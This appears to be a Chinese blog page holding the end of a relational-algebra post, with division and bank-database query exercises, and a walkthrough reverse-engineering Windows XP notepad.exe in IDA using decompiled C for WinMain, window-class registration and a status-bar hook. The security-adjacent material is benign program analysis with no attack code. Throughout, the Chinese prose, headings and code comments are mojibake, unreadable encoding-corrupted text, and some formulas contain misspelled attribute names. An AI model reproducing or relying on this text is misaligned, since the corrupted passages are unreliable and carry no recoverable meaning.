<p>ä¸¥è°¨å®šä¹‰ä¸º<br>$$<br>r\div s&#x3D;{t|t\in \Pi_{R-S}(r)\ \land\forall u\in s\rightarrow tu\in r}<br>$$</p>
<blockquote>
<p>tå…ƒç»„çš„å±æ€§æ˜¯R-Så‰©ä¸‹çš„å±æ€§,</p>
<p>å¹¶ä¸”tå’Œsä¸­ä»»ä½•å…ƒç»„çš„ç§¯éƒ½å±äºr.</p>
<p>åˆ™tå°±æ˜¯$r\div s$é›†åˆçš„å…ƒç´ </p>
</blockquote>
<h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><h4 id="ç»ƒä¹ 1å·å‡ºæœ€å€¼"><a href="#ç»ƒä¹ 1å·å‡ºæœ€å€¼" class="headerlink" title="ç»ƒä¹ 1å·å‡ºæœ€å€¼"></a>ç»ƒä¹ 1å·å‡ºæœ€å€¼</h4><p>æŸ¥å‡ºaccountè¡¨ä¸­æœ€å¤§(å°)å­˜æ¬¾(balance)æ•°</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220915002527616.png" alt="image-20220915002527616"><br>$$<br>\begin{aligned}<br>æœ€å¤§å­˜æ¬¾æ•°&amp;&#x3D;\Pi_{balance}(account)-\Pi_{acnt.balance}(\sigma_{acnt.balance&lt;account.balance}(\rho_{acnt}(account)\times account))\<br>æœ€å°å­˜æ¬¾æ•°&amp;&#x3D;\Pi_{balance}(account)-\Pi_{account.balance}(\sigma_{acnt.balance&lt;account.balance}(\rho_{acnt}(account)\times account))<br>\end{aligned}<br>$$<br>ç”¨$\sigma_{acnt.balance&lt;account.balance}(\rho_{acnt}(account)\times account)$è¿™ä¸ªé€‰æ‹©è¹‰è·ä¸€ä¸‹,å°±åŒ…å«äº†æ‰€æœ‰å‰å­˜æ¬¾å°äºåå­˜æ¬¾çš„æ¡ç›®,</p>
<p>è¿™äº›æ¡ç›®ä¸­,æ¯ä¸€æ¡éƒ½æ˜¯acnt.balanceä½œä¸ºå‰é¡¹ä¹Ÿå°±æ˜¯å°çš„ä¸€é¡¹,account.balanceä½œä¸ºåé¡¹ä¹Ÿå°±æ˜¯å¤§çš„ä¸€é¡¹,</p>
<p>é‚£ä¹ˆacnt.balanceä¸å«æœ€å¤§é¡¹,account.balanceä¸å«æœ€å°é¡¹</p>
<h4 id="ç»ƒä¹ 2è¿å·è½¬åŒ–"><a href="#ç»ƒä¹ 2è¿å·è½¬åŒ–" class="headerlink" title="ç»ƒä¹ 2è¿å·è½¬åŒ–"></a>ç»ƒä¹ 2è¿å·è½¬åŒ–</h4><p>æŸ¥å‡ºè‡³å°‘æœ‰ä¸€ä¸ªè´¦æˆ·ä¸Šæœ‰å¤šäº700å—é’±å­˜æ¬¾çš„ç”¨æˆ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220915000754242.png" alt="image-20220915000754242"></p>
<p>ç”¨å·ç§¯åšçš„è¯<br>$$<br>\Pi_{customer_name}(\sigma_{account.number&#x3D;depositor.number}(\sigma_{account.balance&gt;700}(account)\times depositor))<br>$$</p>
<p>ç”¨è‡ªç„¶è¿æ¥åšçš„è¯<br>$$<br>\Pi_{customer_name}(\sigma_{account.balance&gt;700}(account\Join depositor))<br>$$</p>
<h4 id="ç»ƒä¹ 3å·å‡ºå¤šä¸ªè´¦æˆ·"><a href="#ç»ƒä¹ 3å·å‡ºå¤šä¸ªè´¦æˆ·" class="headerlink" title="ç»ƒä¹ 3å·å‡ºå¤šä¸ªè´¦æˆ·"></a>ç»ƒä¹ 3å·å‡ºå¤šä¸ªè´¦æˆ·</h4><p>æŸ¥è¯¢è‡³å°‘æœ‰ä¸¤ä¸ªè´¦æˆ·çš„ç”¨æˆ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220915005408814.png" alt="image-20220915005408814"></p>
<p>$$<br>\Pi_{customer_name}(\sigma_{dpstr.customer_name&#x3D;depositer.custormer_name\ \land \ dpstr.account_number\ne depositor.account_number}(\rho_{dpstr}(depositer)\times depositer))<br>$$</p>
<h4 id="ç»ƒä¹ 4å…ˆè¿åå·"><a href="#ç»ƒä¹ 4å…ˆè¿åå·" class="headerlink" title="ç»ƒä¹ 4å…ˆè¿åå·"></a>ç»ƒä¹ 4å…ˆè¿åå·</h4><p>æŸ¥å‡ºè‡³å°‘åœ¨ä¸¤ä¸ªåˆ†è¡Œ(branch)éƒ½æœ‰è´¦æˆ·(account)çš„ç”¨æˆ·(customer)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220915000336679.png" alt="image-20220915000336679"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯,ä¸€ä¸ªäººå¯ä»¥åœ¨åŒä¸€ä¸ªæ”¯è¡Œæœ‰å¤šä¸ªè´¦å·,åªè€ƒè™‘æŸ¥è¯¢è´¦æˆ·æ•°å¤šäºä¸¤ä¸ªçš„ç”¨æˆ·ä¸æˆç«‹</p>
<p>æ˜¾ç„¶å…ˆæŠŠä¸¤ä¸ªè¡¨ä»¥account_numberä¸ºå…¬å…±å±æ€§,è‡ªç„¶è¿æ¥èµ·æ¥,å¯¹è¿™ä¸ªè‡ªç„¶è¿æ¥è¡¨è¿›è¡Œå·ç§¯,å°±èƒ½è¹‰è·å‡ºåŒä¸€ä¸ªäººçš„ä¸åŒæ”¯è¡Œè´¦æˆ·ç»„åˆäº†<br>$$<br>\Pi_{customer_name}(\sigma_{l.custormer_name&#x3D;r.custormer_name\land l.branch_name\ne r.branch_name}(\rho_l(depositor \Join account)\times \rho_r(depositor\Join account)))<br>$$</p>
<h4 id="ç»ƒä¹ 5è‡ªç„¶è¿æ¥"><a href="#ç»ƒä¹ 5è‡ªç„¶è¿æ¥" class="headerlink" title="ç»ƒä¹ 5è‡ªç„¶è¿æ¥"></a>ç»ƒä¹ 5è‡ªç„¶è¿æ¥</h4><p>æŸ¥æ‰¾åœ¨å¸ƒé²å…‹æ—å¸‚æœ‰è´¦æˆ·çš„ç”¨æˆ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220915002042041.png" alt="image-20220915002042041"></p>
<p>$$<br>\Pi_{customer_name}(\sigma_{branch_city&#x3D;Brooklyn}(account\Join branch))<br>$$</p>
<blockquote>
<p>åªè¦åœ¨æ˜¯å¸ƒé²å…‹æ—å¸‚æœ‰ä¸€ä¸ªè´¦æˆ·å°±å¯ä»¥äº†</p>
</blockquote>
<h4 id="ç»ƒä¹ 6é™¤æ³•å…³ç³»"><a href="#ç»ƒä¹ 6é™¤æ³•å…³ç³»" class="headerlink" title="ç»ƒä¹ 6é™¤æ³•å…³ç³»"></a>ç»ƒä¹ 6é™¤æ³•å…³ç³»</h4><p>æŸ¥æ‰¾åœ¨å¸ƒé²å…‹æ—å¸‚<strong>ä»»æ„æ”¯è¡Œ</strong>éƒ½æœ‰è´¦æˆ·çš„ç”¨æˆ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220915002042041.png" alt="image-20220915002042041"></p>
<p>$$<br>\Pi_{customer_name,branch_name}(\sigma_{branch_city&#x3D;Brooklyn}(account\Join branch))\div \Pi_{branch_name}(\sigma_{branch_city&#x3D;Brooklyn}(branch))<br>$$</p>
<h2 id="å…³ç³»ä»£æ•°è¡¨è¾¾å¼åŒ–ç®€"><a href="#å…³ç³»ä»£æ•°è¡¨è¾¾å¼åŒ–ç®€" class="headerlink" title="å…³ç³»ä»£æ•°è¡¨è¾¾å¼åŒ–ç®€"></a>å…³ç³»ä»£æ•°è¡¨è¾¾å¼åŒ–ç®€</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/12/windows%20XP%20notepad.exe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/12/windows%20XP%20notepad.exe%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">windows XP notepad.exeé€†å‘åˆ†æ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-12 16:54:00 / Modified: 16:55:15" itemprop="dateCreated datePublished" datetime="2022-09-12T16:54:00+08:00">2022-09-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windows-XP-notepad-exeé€†å‘åˆ†æ"><a href="#windows-XP-notepad-exeé€†å‘åˆ†æ" class="headerlink" title="windows XP notepad.exeé€†å‘åˆ†æ"></a>windows XP notepad.exeé€†å‘åˆ†æ</h1><p>åŸºæœ¬ç»“æ„å’Œæˆ‘ä»¬å†™çš„å·®ä¸å¤š,éƒ½æ˜¯ä¸»çª—å£åŠ ä¸€ä¸ªç¼–è¾‘æ§ä»¶</p>
<p>ä¸åŒçš„æ˜¯,äººå®¶çš„æœ‰æ›´nbçš„åœ°æ–¹:</p>
<p>æœ‰çŠ¶æ€æ ,å¯ä»¥æ˜¾ç¤ºå½“å‰è¾“å…¥ä½ç½®(è¡Œå·,åˆ—å·),çŠ¶æ€æ æ˜¯é’©å­é©±åŠ¨çš„</p>
<p>å¯ä»¥åˆ†æå‘½ä»¤è¡Œ</p>
<h2 id="å¯»æ‰¾WinMain"><a href="#å¯»æ‰¾WinMain" class="headerlink" title="å¯»æ‰¾WinMain"></a>å¯»æ‰¾WinMain</h2><p>idaä¸€å¼€å§‹ä¼šåœåœ¨ç¨‹åºå…¥å£ç‚¹,startå‡½æ•°è¿™é‡Œ,æ˜¾ç„¶ä¸æ˜¯WinMainå‡½æ•°,ä¹Ÿä¸æ˜¯mainå‡½æ•°,æ˜¯è¿è¡Œç¯å¢ƒåˆå§‹åŒ–å‡½æ•°,ç›®å‰å°šæœªå­¦ä¹ WinMainä¹‹å‰çš„æ‰§è¡Œè¿‡ç¨‹,ç°åœ¨çš„ä»»åŠ¡å°±æ˜¯æ‰¾åˆ°WinMainåœ¨å“ªé‡Œ</p>
<p>startå‡½æ•°çœ‹èµ·æ¥å¾ˆä¹±ä¸å¥½åˆ†æ,åœ¨functionsåˆ—è¡¨ä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°WinMainå­—æ ·,ä½†æ˜¯å‡½æ•°åˆ—è¡¨é‡Œé¢æœ‰ä¸€ä¸ªDialogFunc,ä¼°è®¡æ˜¯æŸä¸ªçª—å£è¿‡ç¨‹å‡½æ•°è°ƒç”¨çš„å¯¹è¯æ¡†</p>
<p>å¦‚æœæ˜¯ä¸»çª—å£è¿‡ç¨‹,é‚£ä¹ˆå°±ç¦»ç€æ‰¾åˆ°WinMainä¸è¿œäº†</p>
<p>ä»DialogFuncä¸ŠæŸ¥çœ‹äº¤å‰å¼•ç”¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220831223117517.png" alt="image-20220831223117517"></p>
<p>åˆ°è¿™ä¸ªsub_1002919å‡½æ•°çœ‹çœ‹å»</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_1002919</span><span class="params">(HWND hWnd, __int16 a2, <span class="type">int</span> a3)</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°åªæœ‰ä¸‰ä¸ªå‚æ•°,è€Œçª—å£è¿‡ç¨‹å‡½æ•°è¦æœ‰å››ä¸ªå‚æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span> <span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span>;</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç„¶sub_1002919è¿˜ä¸æ˜¯çª—å£è¿‡ç¨‹å‡½æ•°,é‚£ä¹ˆå†çœ‹sub_1002919çš„äº¤å‰å¼•ç”¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220831223421292.png" alt="image-20220831223421292"></p>
<p>è¿™ä¸¤ä¸ªäº¤å‰å¼•ç”¨æ˜¯åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­çš„,ç°åœ¨å»sub_103134çœ‹çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT __thiscall <span class="title function_">sub_1003134</span><span class="params">(<span class="type">void</span> *this, HWND hWnd, UINT Msg, WPARAM wParam, LPARAM a5)</span>;</span><br></pre></td></tr></table></figure>

<p>å…‰ä»å‡½æ•°å®šä¹‰ä¸Šå°±èƒ½çœ‹å‡º,è¿™åæœ‰å…«ä¹æ˜¯ä¸€ä¸ªçª—å£è¿‡ç¨‹äº†</p>
<p>å†çœ‹çœ‹sub_1003134çš„äº¤å‰å¼•ç”¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220831223624249.png" alt="image-20220831223624249"></p>
<p>å»sub_1004143çœ‹çœ‹</p>
<p>è¿™ä¸ªå‡½æ•°åœ¨æ³¨å†Œçª—å£ç±»,sub_1003134æ˜¯æ³¨å†Œç»™è¿™ä¸ªçª—å£ç±»çš„è¿‡ç¨‹å›è°ƒå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall sub_1004143@&lt;eax&gt;(HINSTANCE a1@&lt;esi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  WNDCLASSEXW v3; <span class="comment">// [esp+4h] [ebp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3.cbSize = <span class="number">48</span>;</span><br><span class="line">  v1 = GetSystemMetrics(<span class="number">41</span>);</span><br><span class="line">  v3.hCursor = LoadCursorW(<span class="number">0</span>, (LPCWSTR)(<span class="number">32513</span> - (v1 != <span class="number">0</span>)));</span><br><span class="line">  v3.hIcon = LoadIconW(a1, (LPCWSTR)<span class="number">2</span>);</span><br><span class="line">  v3.hIconSm = (HICON)LoadImageW(a1, (LPCWSTR)<span class="number">2</span>, <span class="number">1u</span>, <span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">  v3.lpszMenuName = (LPCWSTR)<span class="number">1</span>;</span><br><span class="line">  v3.hInstance = a1;</span><br><span class="line">  v3.lpszClassName = ClassName;</span><br><span class="line">  v3.lpfnWndProc = (WNDPROC)sub_1003134;</span><br><span class="line">  v3.hbrBackground = (HBRUSH)<span class="number">6</span>;</span><br><span class="line">  v3.style = <span class="number">0</span>;</span><br><span class="line">  v3.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">  v3.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> RegisterClassExW(&amp;v3) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¸…æ™°äº†</p>
<p>å†çœ‹çœ‹è°è°ƒç”¨äº†sub_1004143ä¼°è®¡å°±æ˜¯WinMainäº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220831223754846.png" alt="image-20220831223754846"></p>
<p>å»sub_10041CAçœ‹çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_10041CA</span><span class="params">(HINSTANCE hInstance, HGDIOBJ h, <span class="type">int</span> a3, <span class="type">int</span> nCmdShow)</span></span><br></pre></td></tr></table></figure>

<p>å’ŒWinMainå‡½æ•°çš„æ¥å£ä¸€æ¨¡ä¸€æ ·,å››ä¸ªå‚æ•°,__stdcallè°ƒç”¨çº¦å®š,intè¿”å›å€¼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span>;</span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹sub_10041CAå‡½æ•°æ­£æ–‡,å®ƒåŠ è½½äº†é”®ç›˜åŠ é€Ÿé”®,åŠ è½½äº†å…‰æ ‡,æœ€é‡è¦çš„æ˜¯,å®ƒæœ‰æ¶ˆæ¯å¾ªç¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( GetMessageW(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( Msg.message == <span class="number">80</span> )</span><br><span class="line">    PostMessageW(hWndParent, <span class="number">0x8001</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (!hDlg || !IsDialogMessageW(hDlg, &amp;Msg)) &amp;&amp; !TranslateAcceleratorW(hWndParent, hAccTable, &amp;Msg) )</span><br><span class="line">  &#123;</span><br><span class="line">    TranslateMessage(&amp;Msg);</span><br><span class="line">    DispatchMessageW(&amp;Msg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ç°åœ¨å°±å¯ä»¥è‚¯å®šåœ°æŠŠsub_100041CAæ›´åä¸ºWinMain</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220831225104278.png" alt="image-20220831225104278"></p>
<h2 id="ä¸»å‡½æ•°WinMain"><a href="#ä¸»å‡½æ•°WinMain" class="headerlink" title="ä¸»å‡½æ•°WinMain"></a>ä¸»å‡½æ•°WinMain</h2><p>å„ç§å“‘åèµ·ä¸€ä¸ªç›¸å¯¹åˆç†çš„åå­—,å„ç§å¸¸æ•°æ”¹æˆæšä¸¾å€¼,è¿™æ ·åæ±‡ç¼–çš„WinMainå°±çœ‹èµ·æ¥å¾ˆé¡ºçœ¼äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">WPARAM __stdcall <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HGDIOBJ hPrevInstance, <span class="type">int</span> a3, <span class="type">int</span> nCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> WCHAR *rawCMDLine; <span class="comment">// edi</span></span><br><span class="line">  HMODULE sysMetrics; <span class="comment">// eax</span></span><br><span class="line">  FARPROC RegisterPenApp; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> WCHAR *pureCMDLine; <span class="comment">// eax</span></span><br><span class="line">  DWORD pid; <span class="comment">// eax</span></span><br><span class="line">  HWINEVENTHOOK hHook; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagMSG</span> <span class="title">Msg</span>;</span> <span class="comment">// [esp+8h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">void</span> (__stdcall *regPenApp)(_DWORD, _DWORD); <span class="comment">// [esp+24h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  rawCMDLine = GetCommandLineW();</span><br><span class="line">  sysMetrics = GetSystemMetrics(<span class="number">41</span>);</span><br><span class="line">  RegisterPenApp = GetProcAddress(sysMetrics, <span class="string">&quot;RegisterPenApp&quot;</span>);</span><br><span class="line">  regPenApp = RegisterPenApp;</span><br><span class="line">  <span class="keyword">if</span> ( RegisterPenApp )</span><br><span class="line">    (RegisterPenApp)(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  pureCMDLine = CmdLineNoProgName(rawCMDLine);  <span class="comment">// å»æ‰å‘½ä»¤è¡Œä¸­çš„ç¨‹åºå</span></span><br><span class="line">  <span class="keyword">if</span> ( myRegister(hInstance, hPrevInstance, pureCMDLine, nCmdShow) )<span class="comment">// æ³¨å†Œçª—å£ç±»,åˆ›å»ºçª—å£å®ä¾‹</span></span><br><span class="line">  &#123;</span><br><span class="line">    pid = GetCurrentProcessId();                <span class="comment">// å½“å‰è¿›ç¨‹id</span></span><br><span class="line">    hHook = SetWinEventHook(EVENT_OBJECT_LOCATIONCHANGE, EVENT_OBJECT_LOCATIONCHANGE, <span class="number">0</span>, pfnWinEventProc, pid, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">// é’©å­åªå¯¹EVENT_OBJECT_LOCATIONCHANGEå…³å¿ƒ,åªè¦æ˜¯è®°äº‹æœ¬çš„å½¢çŠ¶ä½ç½®å‘ç”Ÿå˜åŒ–,å°±ä¼šè§¦å‘è¿™ä¸ªé’©å­</span></span><br><span class="line">    <span class="keyword">while</span> ( GetMessageW(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) )        <span class="comment">// æ¶ˆæ¯å¾ªç¯</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Msg.message == WM_INPUTLANGCHANGEREQUEST )</span><br><span class="line">        PostMessageW(hWndParent, <span class="number">0x8001</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (!hDlg || !IsDialogMessageW(hDlg, &amp;Msg)) &amp;&amp; !TranslateAcceleratorW(hWndParent, hAccTable, &amp;Msg) )<span class="comment">// åˆ¤æ–­æ˜¯ä¸æ˜¯æŸ¥æ‰¾æ¡†çš„æ¶ˆæ¯</span></span><br><span class="line">      &#123;</span><br><span class="line">        TranslateMessage(&amp;Msg);</span><br><span class="line">        DispatchMessageW(&amp;Msg);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_10018B0();                              <span class="comment">// é‡Šæ”¾&quot;é¡µé¢è®¾ç½®&quot;ç»“æ„ä½“</span></span><br><span class="line">    LocalFree(hMem);</span><br><span class="line">    <span class="keyword">if</span> ( hHook )</span><br><span class="line">      UnhookWinEvent(hHook);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Msg.wParam = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( regPenApp )</span><br><span class="line">    regPenApp(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> Msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å’Œæˆ‘ä»¬è‡ªå·±å†™çš„è®°äº‹æœ¬æœ‰ä¸€äº›ä¸åŒçš„åœ°æ–¹,</p>
<p>é¦–å…ˆæ˜¯RegisterPenAppè¿™ä¸ªä¸œè¥¿,ä¸Šç½‘æŸ¥ä¹Ÿæ²¡æœ‰æŸ¥åˆ°è¯¦ç»†çš„èµ„æ–™,<a target="_blank" rel="noopener" href="http://winapi.freetechsecrets.com/penapi/PENAPIRegisterPenApp.htm">RegisterPenApp</a>è¿™é‡Œè¯´æ˜¯win95ä¹‹å‰çš„API,å¤ªè€äº†ä¸è®©ç”¨äº†,è¿™ä¸ªé—®é¢˜ä¸å¤§</p>
<p>ç„¶åæ˜¯å¯¹WinMainçš„å‘½ä»¤è¡Œå‰¥äº†å£³,å»æ‰äº†ç¬¬ä¸€ä¸ªå‚æ•°,ç¨‹åºç›®å½•,è¿™ä¸ªé—®é¢˜ä¸å¤§</p>
<p>ç„¶åç»™æœ¬è¿›ç¨‹æ³¨å†Œäº†ä¸€ä¸ªé’©å­,é’ˆå¯¹EVENT_OBJECT_LOCATIONCHANGEäº‹ä»¶,<strong>è¿™ä¸ªéœ€è¦ç ”ç©¶ä¸€ä¸‹</strong></p>
<h2 id="äº‹ä»¶é’©å­hookfunc"><a href="#äº‹ä»¶é’©å­hookfunc" class="headerlink" title="äº‹ä»¶é’©å­hookfunc"></a>äº‹ä»¶é’©å­hookfunc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">HWND __stdcall <span class="title function_">hookfunc</span><span class="params">(<span class="type">int</span> flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  LRESULT lineNumber; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> logicLineNumber; <span class="comment">// edi</span></span><br><span class="line">  HWND colIndex; <span class="comment">// eax</span></span><br><span class="line">  WPARAM logicColNumber; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">wchar_t</span> Buffer[<span class="number">128</span>]; <span class="comment">// [esp+Ch] [ebp-108h] BYREF</span></span><br><span class="line">  LPARAM lParam; <span class="comment">// [esp+10Ch] [ebp-8h] BYREF</span></span><br><span class="line">  WPARAM wParam; <span class="comment">// [esp+110h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  SendMessageW(hWnd, EM_GETSEL, &amp;wParam, &amp;lParam);<span class="comment">// è·å–æ­£åœ¨é«˜äº®çš„ä½ç½®ä¿¡æ¯</span></span><br><span class="line">  lineNumber = SendMessageW(hWnd, EM_LINEFROMCHAR, wParam, <span class="number">0</span>);<span class="comment">// è·å–é«˜äº®åŒºåŸŸçš„å­—ç¬¦ç´¢å¼•</span></span><br><span class="line">  logicLineNumber = lineNumber + <span class="number">1</span>;             <span class="comment">// äººä»1å¼€å§‹è®¡æ•°,è®¡ç®—æœºä»0å¼€å§‹è®¡æ•°</span></span><br><span class="line">  colIndex = SendMessageW(hWnd, EM_LINEINDEX, lineNumber, <span class="number">0</span>);<span class="comment">// è¡Œå·</span></span><br><span class="line">  logicColNumber = wParam - colIndex + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flag || logicColNumber != historyColNumber || logicLineNumber != historyLineNumber )</span><br><span class="line">  &#123;</span><br><span class="line">    snwprintf(Buffer, <span class="number">0x7F</span>u, Format, logicLineNumber, wParam - colIndex + <span class="number">1</span>);<span class="comment">// ç¬¬å‡ è¡Œç¬¬å‡ åˆ—æ‰“å°åˆ°Buffer</span></span><br><span class="line">    colIndex = hwndStatus;                      <span class="comment">// hwndStatusçŠ¶æ€æ¡†å¥æŸ„</span></span><br><span class="line">    Buffer[<span class="number">127</span>] = <span class="number">0</span>;                            <span class="comment">// æœ€åä¸€ä¸ªå­—ç¬¦ç½®é›¶</span></span><br><span class="line">    <span class="keyword">if</span> ( hwndStatus )</span><br><span class="line">      colIndex = SendMessageW(hwndStatus, SB_SETTEXTW, <span class="number">1u</span>, Buffer);<span class="comment">// å¦‚æœå½“å‰å­˜åœ¨çŠ¶æ€æ¡†,åˆ™å‘çŠ¶æ€ç‹‚å‘é€Buffer</span></span><br><span class="line">  &#125;</span><br><span class="line">  historyLineNumber = logicLineNumber;          <span class="comment">// 